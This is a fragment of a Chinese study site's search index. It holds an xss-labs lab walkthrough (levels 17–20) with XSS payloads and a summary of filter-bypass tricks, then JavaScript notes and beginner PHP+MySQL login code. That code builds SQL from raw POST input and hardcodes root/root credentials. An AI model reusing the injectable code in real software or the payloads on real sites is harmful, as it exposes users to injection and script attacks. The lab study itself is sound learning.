<li>\u540e\u7aef\u4ee3\u7801\uff1a</li> </ol> PHP<pre><code>&lt;?php\nini_set(\"display_errors\", 0);\necho \"&lt;embed src=index.png?\" . htmlspecialchars($_GET[\"arg01\"]) . \"=\" . htmlspecialchars($_GET[\"arg02\"]) . \" width=100% heigth=100%&gt;\";\n?&gt;\n</code></pre>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-18","title":"level-18 \u53c2\u6570\u62fc\u63a5","text":"<p>http://127.0.0.1/xss-labs/level18.php?arg01=a&amp;arg02=b</p> <ol> <li>\u548c17\u5173\u4e00\u6a21\u4e00\u6837</li> </ol>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-19-flash-xss","title":"level-19 flash xss","text":"<p>http://127.0.0.1/xss-labs/level19.php?arg01=a&amp;arg02=b</p> <ol> <li>\u9996\u5148\u4ece\u9875\u9762\u6e90\u7801\u6765\u770b\uff0c\u4e5f\u662f embed \u6807\u7b7e</li> <li>\u522b\u4eba\u8bf4\uff1a\u81f3\u4e8e\u4e3a\u5565\u8fd9\u91cc\u4e0d\u80fd\u7528\u524d\u9762\u4e24\u5173\u7684\u65b9\u6cd5\u4e86\uff1f\u662f\u56e0\u4e3a\u6e90\u7801\u628a\u4e0a\u9762\u6f0f\u6d1e\u95ed\u5408\u4e86,\u52a0\u4e86\u4e00\u5bf9\u53cc\u5f15\u53f7\uff0c\u7ed5\u4e0d\u51fa\u53bb\u4e86\uff08\u53ea\u80fd\u7528 \" \u95ed\u5408\uff0c\u4f46\u662f \" \u4f1a\u88ab\u8f6c\u4e49\uff0c\u65e0\u6cd5\u95ed\u5408\uff0c\u6240\u4ee5\u5373\u4f7f\u770b\u8d77\u6765\u662f\u597d\u7684\uff0c\u4e5f\u65e0\u6cd5\u5f39\u6846\uff09</li> <li>\u540e\u7aef\u957f\u8fd9\u6837\uff1a PHP<pre><code>&lt;?php\nini_set(\"display_errors\", 0);\necho '&lt;embed src=\"xsf03.swf?' . htmlspecialchars($_GET[\"arg01\"]) . \"=\" . htmlspecialchars($_GET[\"arg02\"]) . '\" width=100% heigth=100%&gt;';\n?&gt;\n</code></pre></li> <li>\u8c8c\u4f3c\u6d89\u53ca\u5230 flash \u53cd\u7f16\u8bd1\u5565\u7684\uff0c\u6211\u4e5f\u4e0d\u4f1a\uff0c\u9644\u4e0a\u5077\u6765\u7684 payload\uff1a<code>arg01=version&amp;arg02=&lt;a href=\"javascript:alert(1)\"&gt;123&lt;/a&gt;</code></li> </ol>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-20-flash-xss","title":"level-20 flash xss","text":"<ol> <li>\u5077\u6765\u7684 payload\uff1a<code>arg01=id&amp;arg02=\\%22))}catch(e){}if(!self.a)self.a=!alert(1)</code></li> <li>\u540e\u7aef\uff1a</li> </ol> PHP<pre><code>&lt;?php\nini_set(\"display_errors\", 0);\necho '&lt;embed src=\"xsf04.swf?' . htmlspecialchars($_GET[\"arg01\"]) . \"=\" . htmlspecialchars($_GET[\"arg02\"]) . '\" width=100% heigth=100%&gt;';\n?&gt;\n</code></pre> <ol> <li>\u5927\u4f6c\u7684\u6587\u7ae0\uff1axss-labs \u7b2c20\u5173</li> </ol>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#_1","title":"\u603b\u7ed3","text":"<p>\uff08\u5c0f\u58f0\u8bf4\u4e00\u53e5\uff0c\u8fd9\u90e8\u5206\u4e5f\u662f\u5077\u7684\uff09</p> <p>\u53cd\u5c04\u578bXSS\u6d4b\u8bd5\u6b65\u9aa4\u603b\u7ed3\uff1a 1. \u68c0\u6d4b\u8f93\u5165\u53d8\u91cf\uff0c\u786e\u8ba4\u6bcf\u4e2a web \u9875\u9762\u4e2d\u7528\u6237\u53ef\u81ea\u5b9a\u4e49\u7684\u53d8\u91cf\uff0c\u5982 HTTP \u53c2\u6570\u3001POST \u6570\u636e\u3001\u9690\u85cf\u8868\u5355\u5b57\u6bb5\u503c\u3001\u9884\u5b9a\u4e49\u7684 radio \u503c\u6216\u9009\u62e9\u503c 2. \u5206\u522b\u786e\u8ba4\u6bcf\u4e2a\u8f93\u5165\u53d8\u91cf\u662f\u5426\u5b58\u5728 xss\u6f0f\u6d1e\u3002\u53d8\u91cf\u8f93\u5165\u5904\u8f93\u5165 poc\uff0c\u67e5\u770b\u8fd4\u56de\u7684 web\u9875\u9762\u7684 html \u4e2d poc \u4ee3\u7801\u662f\u5426\u88ab\u8fc7\u6ee4\uff0c\u6d4f\u89c8\u5668\u662f\u5426\u54cd\u5e94 poc\uff0c\u82e5\u5b58\u5728\u8fc7\u6ee4\uff0c\u8fdb\u884c\u6d4b\u8bd5\u67e5\u770b\u80fd\u5426\u8fdb\u884c\u7ed5\u8fc7\u3002</p> <p>XSS\u7684\u653b\u9632\uff1a 1. \u653b\uff1a\u5229\u7528&lt;&gt;\u6807\u8bb0\uff0c\u6784\u9020<code>&lt;script&gt;</code>\u6807\u7b7e\u53ef\u6267\u884c javascript\u7684xss\u4ee3\u7801\u3002 \u9632\uff1axss\u8fc7\u6ee4\u51fd\u6570\u9700\u8fc7\u6ee4<code>&lt;&gt;&lt;script&gt;&lt;/script&gt;</code>\u7b49\u5b57\u7b26\u3002 2. \u653b\uff1a\u5229\u7528 html \u6807\u7b7e\u5c5e\u6027\u652f\u6301 javascript:\u4f2a\u534f\u8bae\uff08\u652f\u6301\u6807\u7b7e\u5c5e\u6027\u7684\u6709href\u3001lowsrc\u3001bgsound\u3001background\u3001value\u3001action\u3001dynsrc\u7b49\uff09\uff0c\u6267\u884cxss\u4ee3\u7801\u3002 \u9632\uff1axss \u8fc7\u6ee4\u51fd\u6570\u9700\u8fc7\u6ee4JavaScript\u7b49\u5173\u952e\u5b57\u3002 3. \u5229\u7528 javascript \u5728\u5f15\u53f7\u4e2d\u53ea\u7528\u5206\u53f7\u5206\u9694\u5355\u8bcd\u6216\u5f3a\u5236\u8bed\u53e5\u7ed3\u675f\uff0c\u7528\u6362\u884c\u7b26\u5ffd\u7565\u5206\u53f7\u5f3a\u5236\u7ed3\u675f\u4e00\u4e2a\u5b8c\u6574\u8bed\u53e5\uff0c\u800c\u5ffd\u7565\u56de\u8f66\u3001\u7a7a\u683c\u3001tab\u7b49\u952e\uff0c\u7ed5\u8fc7\u5bf9 javascript \u7684\u5173\u952e\u5b57\u7684\u8fc7\u6ee4\u3002 4. \u653b\uff1a\u5229\u7528html\u6807\u7b7e\u5c5e\u6027\u503c\u652f\u6301ascii\u7801\uff0c\u5bf9\u6807\u7b7e\u5c5e\u6027\u503c\u8fdb\u884c\u8f6c\u7801\u8fdb\u884c\u89c4\u5219\u5e93\u7684\u7ed5\u8fc7\u3002 \u9632\uff1axss \u8fc7\u6ee4\u51fd\u6570\u9700\u8fc7\u6ee4&amp;#\\\u7b49\u5b57\u7b26\u3002 5. \u5229\u7528\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\uff0c\u89e6\u53d1\u4e8b\u4ef6\uff0c\u6267\u884cxss\u4ee3\u7801\u3002\u4f8b\u5982<code>&lt;img src='#' onerror=alert(/xss/)&gt;</code>,\u5f53\u6d4f\u89c8\u5668\u54cd\u5e94\u9875\u9762\u65f6\uff0c\u627e\u4e0d\u5230\u56fe\u7247\u7684\u5730\u5740\uff0c\u89e6\u53d1onerror\u4e8b\u4ef6\u3002 6. \u653b\uff1a\u5229\u7528css\u6267\u884cjavascript\u4ee3\u7801\uff0ccss\u4ee3\u7801\u4e2d\u5229\u7528expression\u89e6\u53d1xss\u6f0f\u6d1e\u3002\u5982\u4e0b\u6240\u793a\uff1a</p> HTML<pre><code>&lt;div style=\"width: expression(alert('xss'));&gt;\n\n&lt;img src=\"#\" style=\"xss:expression(alert(/xss/));\"&gt;\n\n&lt;style&gt;body {background-image:expression(alert(\"xss\"));}&lt;/style&gt;\n\n&lt;div style=\"list-style-image:url(javascript:alert('xss'))\"&gt;\n</code></pre> <p>css\u4ee3\u7801\u4e2d\u5229\u7528@import\u89e6\u53d1xss</p> HTML<pre><code>&lt;stytle&gt;\n\n@import 'javascript:alert(\"XSS\")';\n\n&lt;/stytle&gt;\n</code></pre> <p>css\u4ee3\u7801\u4e2d\u4f7f\u7528@import\u548clink\u65b9\u5f0f\u5bfc\u5165\u5916\u90e8\u542b\u6709xss\u4ee3\u7801\u7684\u6837\u5f0f\u8868\u6587\u4ef6</p> HTML<pre><code>&lt;link rel=\"stytlesheet\" href=\"http://www.***.com/a.css\"&gt;\n\n&lt;stytle type='text/css'&gt;@import url(http://www.*.com/a.css);&lt;/style&gt;\n</code></pre> <p>\u9632\uff1axss\u8fc7\u6ee4\u51fd\u6570\u9700\u8fc7\u6ee4style\u6807\u7b7e\u3001style\u5c5e\u6027\u3001expression\u3001javascript\u3001import\u7b49\u5173\u952e\u5b57\u3002</p> <ol> <li>\u5229\u7528\u5927\u5c0f\u5199\u6df7\u6dc6\u3001\u4f7f\u7528\u5355\u5f15\u53f7\u3001\u4e0d\u4f7f\u7528\u5f15\u53f7\u3001\u4f7f\u7528/\u63d2\u5165\u5728img src\u4e2d\u95f4\u3001\u6784\u9020\u4e0d\u540c\u7684\u5168\u89d2\u5b57\u7b26\u3001\u8fd0\u7528/**/\u6df7\u6dc6\u8fc7\u6ee4\u89c4\u5219\u6765\u7ed5\u8fc7\u8fc7\u6ee4\u51fd\u6570</li> <li>\u5229\u7528\u5b57\u7b26\u7f16\u7801\u3002javascript\u652f\u6301unicode\u3001escapes\u3001\u5341\u516d\u8fdb\u5236\u3001\u516b\u8fdb\u5236\u7b49\u7f16\u7801\u5f62\u5f0f\u3002</li> </ol>"},{"location":"WEB/others/JavaScript%E7%AC%94%E8%AE%B0/","title":"JavaScript\u7b14\u8bb0","text":""},{"location":"WEB/others/JavaScript%E7%AC%94%E8%AE%B0/#javascript","title":"JavaScript\u7b14\u8bb0","text":"<ol> <li>\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32 \uff08\u4e09\u79cd\u8f6c\u6362\u65b9\u5f0f\u4e00\u822c\u662f\u4f7f\u7528\u7b2c\u4e09\u79cd\uff0c\u8fd9\u4e00\u79cd\u4e5f\u6210\u4e3a'\u9690\u5f0f\u8f6c\u6362'\uff09</li> </ol> \u5e8f\u53f7 \u65b9\u6cd5 \u8bf4\u660e \u6848\u4f8b 1 toString() \u8f6c\u6210\u5b57\u7b26\u4e32 var num=1; alert(num.toString()); 2 String() \u5f3a\u5236\u8f6c\u6362 \u8f6c\u6210\u5b57\u7b26\u4e32 var num=1; alert(String(num)); 3 \u52a0\u53f7\u62fc\u63a5\u5b57\u7b26\u4e32 \u548c\u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u7ed3\u679c\u90fd\u662f\u5b57\u7b26\u4e32 var num=1; alert(num + ' '); <ol> <li>\u8f6c\u6362\u4e3a\u6570\u5b57 \uff081\u548c2 \u662f\u91cd\u70b9\uff09</li> </ol> \u5e8f\u53f7 \u65b9\u5f0f \u8bf4\u660e \u6848\u4f8b 1 parseInt(string) \u51fd\u6570 \u5c06string\u7c7b\u578b\u8f6c\u6210\u6574\u6570\u6570\u503c\u578b parseInt('78') 2 parseFloat(string) \u51fd\u6570 \u5c06string\u7c7b\u578b\u8f6c\u6210\u6d6e\u70b9\u6570\u6570\u503c\u578b parseFloat('78.12') 3 Number() \u5f3a\u5236\u8f6c\u6362\u51fd\u6570 \u5c06string\u7c7b\u578b\u8f6c\u6210\u6570\u503c\u578b Number('12') 4 js \u9690\u5f0f\u8f6c\u6362 ( -  *  / ) \u5229\u7528\u7b97\u672f\u8fd0\u7b97\u9690\u5f0f\u8f6c\u6362\u4e3a\u6570\u503c\u578b '12' - 0 <ol> <li>\u8f6c\u6362\u4e3a\u5e03\u5c14\u578b </li> </ol> \u5e8f\u53f7 \u65b9\u5f0f \u8bf4\u660e \u6848\u4f8b 1 Boolean() \u51fd\u6570 \u5176\u4ed6\u7c7b\u578b\u8f6c\u6210\u5e03\u5c14\u503c Boolean('true'); <ul> <li>\u4ee3\u8868\u7a7a\u3001\u5426\u5b9a\u7684\u503c\u4f1a\u88ab\u8f6c\u6362\u6210false\uff0c\u5982''\u30010\u3001NaN\u3001null\u3001undefined</li> <li> <p>\u5176\u4f59\u503c\u90fd\u4f1a\u88ab\u8f6c\u6362\u4e3atrue</p> </li> <li> <p>\u6dfb\u52a0\u5220\u9664\u6570\u7ec4\u5143\u7d20\u7684\u65b9\u6cd5</p> </li> </ul> \u65b9\u6cd5\u540d \u8bf4\u660e \u8fd4\u56de\u503c push(\u53c2\u65701\u2026\u2026) \u672b\u5c3e\u6dfb\u52a0\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\uff0c\u6ce8\u610f\u4fee\u6539\u539f\u6570\u7ec4 \u65b0\u7684\u957f\u5ea6 pop() \u5220\u9664\u6570\u7ec4\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u628a\u6570\u7ec4\u957f\u5ea6\u51cf1\uff0c\u65e0\u53c2\u6570\uff0c\u4fee\u6539\u539f\u6570\u7ec4 \u5220\u9664\u7684\u5143\u7d20\u7684\u503c unshift(\u53c2\u65701\u2026\u2026) \u5411\u6570\u7ec4\u7684\u5f00\u5934\u6dfb\u52a0\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\uff0c\u6ce8\u610f\u4fee\u6539\u539f\u6570\u7ec4 \u65b0\u7684\u957f\u5ea6 shift() \u5220\u9664\u6570\u7ec4\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u628a\u6570\u7ec4\u957f\u5ea6\u51cf1\uff0c\u65e0\u53c2\u6570\uff0c\u4fee\u6539\u539f\u6570\u7ec4 \u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u503c <ol> <li>\u6570\u7ec4\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32</li> </ol> \u65b9\u6cd5\u540d \u8bf4\u660e \u8fd4\u56de\u503c toString() \u628a\u6570\u7ec4\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\uff0c\u9017\u53f7\u5206\u9694\u6bcf\u4e00\u9879 \u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32 join('\u5206\u9694\u7b26') \u65b9\u6cd5\u7528\u4e8e\u628a\u6570\u7ec4\u4e2d\u7684\u6240\u6709\u5143\u7d20\u8f6c\u6362\u6210\u4e00\u4e2a\u5b57\u7b26\u4e32 \u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32 <ol> <li>\u6839\u636e\u5b57\u7b26\u8fd4\u56de\u4f4d\u7f6e\uff08\u5b57\u7b26\u4e32\u7684\u6240\u6709\u65b9\u6cd5\uff0c\u90fd\u4e0d\u4f1a\u4fee\u6539\u5b57\u7b26\u4e32\u672c\u8eab\uff08\u5b57\u7b26\u4e32\u662f\u4e0d\u53ef\u53d8\u7684\uff09\uff0c\u64cd\u4f5c\u5b8c\u6210\u4f1a\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5b57\u7b26\u4e32\uff09</li> </ol> \u65b9\u6cd5\u540d \u8bf4\u660e indexOf('\u8981\u67e5\u627e\u7684\u5b57\u7b26',\u5f00\u59cb\u7684\u4f4d\u7f6e) \u8fd4\u56de\u6307\u5b9a\u5185\u5bb9\u5728\u5143\u5b57\u7b26\u4e32\u4e2d\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u8fd4\u56de\u4e0d\u5230\u5c31\u8fd4\u56de-1\uff0c\u5f00\u59cb\u7684\u4f4d\u7f6e\u662findex\u7d22\u5f15\u53f7 lastIndexOf() \u4ece\u540e\u5f80\u524d\u627e\uff0c\u53ea\u627e\u7b2c\u4e00\u4e2a\u5339\u914d\u7684 <ol> <li>\u6839\u636e\u4f4d\u7f6e\u8fd4\u56de\u5b57\u7b26\uff08\u91cd\u70b9\uff09</li> </ol> \u65b9\u6cd5\u540d \u8bf4\u660e \u4f7f\u7528 charAt(index) \u8fd4\u56de\u6307\u5b9a\u4f4d\u7f6e\u7684\u5b57\u7b26(index\u5b57\u7b26\u4e32\u7684\u7d22\u5f15\u53f7) str.charAt(0) charCodeAt(index) \u83b7\u53d6\u6307\u5b9a\u4f4d\u7f6e\u5904\u5b57\u7b26\u7684ASCII\u7801(index\u7d22\u5f15\u53f7) str.charCodeAt(0) str[index] \u83b7\u53d6\u6307\u5b9a\u4f4d\u7f6e\u5904\u5b57\u7b26 HTML5,IE8+\u652f\u6301 \u548ccharAt()\u7b49\u6548 <ol> <li>\u5b57\u7b26\u4e32\u64cd\u4f5c\u65b9\u6cd5\uff08\u91cd\u70b9\uff0csubstr\u66f4\u662f\u91cd\u70b9\uff09</li> </ol> \u65b9\u6cd5\u540d \u8bf4\u660e concat(str1,str2,str3...) concat()\u65b9\u6cd5\u7528\u4e8e\u8fde\u63a5\u4e24\u4e2a\u6216\u591a\u4e2a\u5b57\u7b26\u4e32\u3002\u62fc\u63a5\u5b57\u7b26\u4e32\uff0c\u7b49\u6548\u4e8e+\uff0c+\u66f4\u5e38\u7528 substr(start,length) \u4ecestart\u4f4d\u7f6e\u5f00\u59cb(\u7d22\u5f15\u53f7)\uff0clength\u53d6\u7684\u4e2a\u6570  \u91cd\u70b9\u8bb0\u4f4f\u8fd9\u4e2a slice(start,end) \u4ecestart\u4f4d\u7f6e\u5f00\u59cb\uff0c\u622a\u53d6\u5230end\u4f4d\u7f6e\uff0cend\u53d6\u4e0d\u5230(\u4ed6\u4eec\u4fe9\u90fd\u662f\u7d22\u5f15\u53f7) substring(start,end) \u4ecestart\u4f4d\u7f6e\u5f00\u59cb\uff0c\u622a\u53d6\u5230end\u4f4d\u7f6e\uff0cend\u53d6\u4e0d\u5230\uff0c\u57fa\u672c\u548cslice\u76f8\u540c\uff0c\u4f46\u662f\u4e0d\u63a5\u53d7\u8d1f\u503c splice() \u6570\u7ec4\u5220\u9664splice(\u7b2c\u51e0\u4e2a\u5f00\u59cb,\u8981\u5220\u9664\u4e2a\u6570)\uff0c\u8fd4\u56de\u88ab\u5220\u9664\u9879\u76ee\u7684\u65b0\u6570\u7ec4\uff0c\u6ce8\u610f:\u8fd9\u4e2a\u4f1a\u5f71\u54cd\u539f\u6570\u7ec4 <p>\uff08slice()\u548csplice()\u76ee\u7684\u57fa\u672c\u76f8\u540c\uff0c\u5efa\u8bae\u540c\u5b66\u91cd\u70b9\u770b\u4e0bsplice()\uff09</p>"},{"location":"WEB/others/JavaScript%E7%AC%94%E8%AE%B0/#api","title":"API","text":"<p>\u5e38\u89c1\u7684\u9f20\u6807\u4e8b\u4ef6</p> \u9f20\u6807\u4e8b\u4ef6 \u89e6\u53d1\u6761\u4ef6 onclick \u9f20\u6807\u70b9\u51fb\u5de6\u952e\u89e6\u53d1 onmouseover \u9f20\u6807\u7ecf\u8fc7\u89e6\u53d1 onmouseout \u9f20\u6807\u79bb\u5f00\u89e6\u53d1 onfocus \u83b7\u5f97\u9f20\u6807\u7126\u70b9\u89e6\u53d1 onblur \u5931\u53bb\u9f20\u6807\u7126\u70b9\u89e6\u53d1 onmousemove \u9f20\u6807\u79fb\u52a8\u89e6\u53d1 onmouseup \u9f20\u6807\u5f39\u8d77\u89e6\u53d1 onmousedoen \u9f20\u6807\u6309\u4e0b\u89e6\u53d1 HTML<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n\n&lt;head&gt;\n    &lt;meta charset=\"utf-8\"&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;p&gt;\u4e0d\u7ba1\u8f93\u5165\u662f\u5426\u6b63\u786e\uff0c\u8f93\u5165\u6846\u90fd\u4f1a\u518d\u8f93\u5165\u540e\u6e05\u7a7a\u3002&lt;/p&gt;\n    &lt;p&gt;\u8bf7\u8f93\u5165 5 ~ 10 \u4e4b\u95f4\u7684\u6570\u5b57\uff1a&lt;/p&gt;\n\n    &lt;input id=\"demo\" type=\"text\"&gt;\n    &lt;button type=\"button\" onclick=\"myFunction()\"&gt;\u70b9\u6211&lt;/button&gt;\n\n    &lt;p id=\"p01\"&gt;&lt;/p&gt;\n\n    &lt;script&gt;\n        function myFunction() {\n            var message, x;\n            message = document.getElementById(\"p01\");\n            message.innerHTML = \"\";\n            x = document.getElementById(\"demo\").value;\n            try {\n                if (x == \"\") throw \"\u503c\u662f\u7a7a\u7684\";\n                if (isNaN(x)) throw \"\u503c\u4e0d\u662f\u4e00\u4e2a\u6570\u5b57\";\n                x = Number(x);\n                if (x &gt; 10) throw \"\u592a\u5927\";\n                if (x &lt; 5) throw \"\u592a\u5c0f\";\n            }\n            catch (err) {\n                message.innerHTML = \"\u9519\u8bef: \" + err + \".\";\n            }\n            finally {\n                document.getElementById(\"demo\").value = \"\";\n            }\n        }\n    &lt;/script&gt;\n\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre> HTML<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n\n&lt;head&gt;\n    &lt;meta charset=\"utf-8\"&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n\n    &lt;p&gt;\u5c40\u90e8\u53d8\u91cf\u8ba1\u6570\u3002&lt;/p&gt;\n    &lt;button type=\"button\" onclick=\"myFunction()\"&gt;\u8ba1\u6570!&lt;/button&gt;\n    &lt;p id=\"demo\"&gt;0&lt;/p&gt;\n\n    &lt;script&gt;\n\n        var add = (function () {\n            var counter = 0;\n            return function () { return counter += 1; }\n        })();\n\n        function myFunction() {\n            document.getElementById(\"demo\").innerHTML = add();\n        }\n\n    &lt;/script&gt;\n\n&lt;/body&gt;\n\n&lt;/html&gt;\n\n\u53d8\u91cf add \u6307\u5b9a\u4e86\u51fd\u6570\u81ea\u6211\u8c03\u7528\u7684\u8fd4\u56de\u5b57\u503c\u3002\n\u81ea\u6211\u8c03\u7528\u51fd\u6570\u53ea\u6267\u884c\u4e00\u6b21\u3002\u8bbe\u7f6e\u8ba1\u6570\u5668\u4e3a 0\u3002\u5e76\u8fd4\u56de\u51fd\u6570\u8868\u8fbe\u5f0f\u3002\nadd\u53d8\u91cf\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u51fd\u6570\u4f7f\u7528\u3002\u975e\u5e38\u68d2\u7684\u90e8\u5206\u662f\u5b83\u53ef\u4ee5\u8bbf\u95ee\u51fd\u6570\u4e0a\u4e00\u5c42\u4f5c\u7528\u57df\u7684\u8ba1\u6570\u5668\u3002\n\u8fd9\u4e2a\u53eb\u4f5c JavaScript \u95ed\u5305\u3002\u5b83\u4f7f\u5f97\u51fd\u6570\u62e5\u6709\u79c1\u6709\u53d8\u91cf\u53d8\u6210\u53ef\u80fd\u3002\n\u8ba1\u6570\u5668\u53d7\u533f\u540d\u51fd\u6570\u7684\u4f5c\u7528\u57df\u4fdd\u62a4\uff0c\u53ea\u80fd\u901a\u8fc7 add \u65b9\u6cd5\u4fee\u6539\u3002\n</code></pre> JavaScript<pre><code>class Site {\n  constructor(name) {\n    this.sitename = name;\n  }\n  present() {\n    return '\u6211\u559c\u6b22' + this.sitename;\n  }\n}\n\nclass Runoob extends Site {\n  constructor(name, age) {\n    super(name);\n    this.age = age;\n  }\n  show() {\n    return this.present() + ', \u5b83\u521b\u5efa\u4e86 ' + this.age + ' \u5e74\u3002';\n  }\n}\n\nlet noob = new Runoob(\"\u83dc\u9e1f\u6559\u7a0b\", 5);\ndocument.getElementById(\"demo\").innerHTML = noob.show();\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E5%88%9D%E7%BA%A7%29/","title":"PHP+MySQL\u535a\u5ba2\uff08\u521d\u7ea7\uff09","text":"<p>\u4f7f\u7528<code>html+php+mysql</code>\uff0c\u53ea\u6709\u767b\u5f55\uff0c\u6ce8\u518c\uff0c\u6ce8\u9500\u529f\u80fd\u3002</p> <p>\u6b64\u7248\u672c\u4e3a\u521d\u7ea7\u7248\uff0c\u529f\u80fd\u4e3a\u6700\u57fa\u7840\u529f\u80fd\u3002</p> <p>\u66f4\u591a\u529f\u80fd\u8bf7\u79fb\u6b65\uff1a[PHP+MySQL\u535a\u5ba2\uff08\u9ad8\u7ea7\uff09]</p> <p>\u9ad8\u7ea7\u7248\u529f\u80fd\u5982\u4e0b\uff1a\uff08html+php+mysql+css\uff09</p> <ol> <li>\u767b\u5f55\u6ce8\u518c</li> <li>\u7528\u6237\u5bc6\u7801\u4fee\u6539</li> <li>\u5934\u50cf\u4e0a\u4f20\u53ca\u4fee\u6539</li> <li>\u53d1\u5e03\u6587\u7ae0\u3001\u6d4f\u89c8\u6587\u7ae0</li> <li>\u6587\u7ae0\u8bc4\u8bba\u53ca\u56de\u590d</li> </ol>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E5%88%9D%E7%BA%A7%29/#connectphp","title":"connect.php","text":"PHP<pre><code>&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;NUC \u8fde\u63a5&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;?php\n$servername = \"localhost\";\n$username = \"root\";\n$password = \"root\";\n$dbname = \"study\";\n\n$conn = new mysqli($servername, $username, $password);\n\nif ($conn-&gt;connect_error) {\n    die(\"\u6570\u636e\u8fde\u63a5\u5931\u8d25\" . $conn-&gt;connect_error);\n}\n\n$conn2 = new mysqli($servername, $username, $password, $dbname);\n\nif ($conn2-&gt;connect_error) {\n    echo (\"\u65e0\u6cd5\u8fde\u63a5\u5230\u6570\u636e\u5e93\uff0c\u5f00\u59cb\u81ea\u52a8\u521b\u5efa\u6570\u636e\u5e93&lt;br&gt;\");\n\n    $sql = \"CREATE DATABASE IF NOT EXISTS \" . $dbname;\n\n    if ($conn-&gt;query($sql) === TRUE) {\n        echo \"\u6570\u636e\u5e93\u521b\u5efa\u6210\u529f\";\n\n        $createtable = \"CREATE TABLE IF NOT EXISTS study_tbl(\n            `id` INT(6) AUTO_INCREMENT PRIMARY KEY,\n            `user` VARCHAR(30) NOT NULL,\n            `pass` VARCHAR(30) NOT NULL,\n            `phone` VARCHAR(11) NOT NULL,\n            `file` VARCHAR(30)\n        )\";\n\n        if ($conn2-&gt;query($createtable) === TRUE) {\n        } else {\n            die(\"\u6570\u636e\u8868\u521b\u5efa\u5931\u8d25\" . $conn2-&gt;connect_error);\n        }\n    } else {\n        die(\"\u6570\u636e\u5e93\u521b\u5efa\u5931\u8d25\" . $conn-&gt;connect_error);\n    }\n} else {\n    $createtable = \"CREATE TABLE IF NOT EXISTS study_tbl(\n        `id` INT(6) AUTO_INCREMENT PRIMARY KEY,\n        `user` VARCHAR(30) NOT NULL,\n        `pass` VARCHAR(30) NOT NULL,\n        `phone` VARCHAR(11) NOT NULL,\n        `file` VARCHAR(30)\n    )\";\n\n    if ($conn2-&gt;query($createtable) === TRUE) {\n    } else {\n        die(\"\u6570\u636e\u8868\u521b\u5efa\u5931\u8d25\" . $conn2-&gt;connect_error);\n    }\n}\n?&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E5%88%9D%E7%BA%A7%29/#dengluphp","title":"denglu.php","text":"PHP<pre><code>&lt;?php\ninclude 'connect.php';\n$username = $_POST['username'];\n$password = $_POST['password'];\nif (isset($username) &amp;&amp; isset($password)) {\n    $chaxun = \"select user,pass from study_tbl where user='$username' and pass='$password';\";\n    $result = $conn2-&gt;query($chaxun);\n    if ($result-&gt;num_rows &gt; 0) {\n        session_start();\n        $_SESSION['login'] = \"true\";\n        header('location:youxi.php');\n    } else {\n        $login = \"\u767b\u9646\u5931\u8d25\";\n        // session_start();\n        $_SESSION['login'] = \"false\";\n        // session_destroy();\n    }\n} else {\n    $login = \"\u7528\u6237\u548c\u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a\uff01\";\n}\n?&gt;\n\n\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;NUC \u767b\u5f55&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;h1&gt;\u6b22\u8fce\u6765\u5230\u6b64\u9875\u9762\u8fdb\u884c\u767b\u5f55&lt;/h1&gt;\n    &lt;form action=\"\" method=\"POST\"&gt;\n        \u8d26\u6237\uff1a&lt;input type=\"text\" name=\"username\" value=\"\"&gt;&lt;br&gt;\n        \u5bc6\u7801\uff1a&lt;input type=\"password\" name=\"password\" value=\"\"&gt;&lt;br&gt;\n        &lt;input type=\"submit\" value=\"\u63d0\u4ea4\"&gt;&lt;br&gt;\n    &lt;/form&gt;\n    &lt;a href=\"zhuce.php\"&gt;\u70b9\u51fb\u6b64\u5904\u8fdb\u884c\u6ce8\u518c&lt;/a&gt;&lt;br&gt;\n    &lt;?php echo \"$login\" ?&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E5%88%9D%E7%BA%A7%29/#sessionphp","title":"session.php","text":"PHP<pre><code>&lt;?php\nsession_start();\n// echo $_SESSION['login'];\nif ($_SESSION['login'] == true) {\n    echo \"\u60a8\u5df2\u767b\u9646\u6210\u529f\uff0c&lt;a 